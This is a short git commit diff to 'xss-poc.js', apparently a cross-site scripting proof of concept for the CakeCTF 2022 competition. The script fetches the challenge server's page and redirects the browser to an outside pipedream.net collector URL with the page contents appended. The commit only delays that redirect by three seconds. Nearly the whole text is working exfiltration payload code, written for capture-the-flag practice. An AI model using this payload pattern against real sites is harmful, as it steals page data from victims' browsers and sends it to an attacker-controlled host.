2ed1dec8fdffe9e6d8af15f78e2652211cdd1726
hi.suguru <36875372+LorseKudos@users.noreply.github.com>
2022-09-04 00:01:26 +0900

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -2,5 +2,5 @@
 fetch("http://web1.2022.cakectf.com:8003/").then((res) => {
 	return res.text();
 }).then(data => {
-	location.href="https://enghd2bd35t7sh5.m.pipedream.net/?data="+data;
+	setTimeout(() => location.href="https://enghd2bd35t7sh5.m.pipedream.net/?data="+data, 3000)
 })
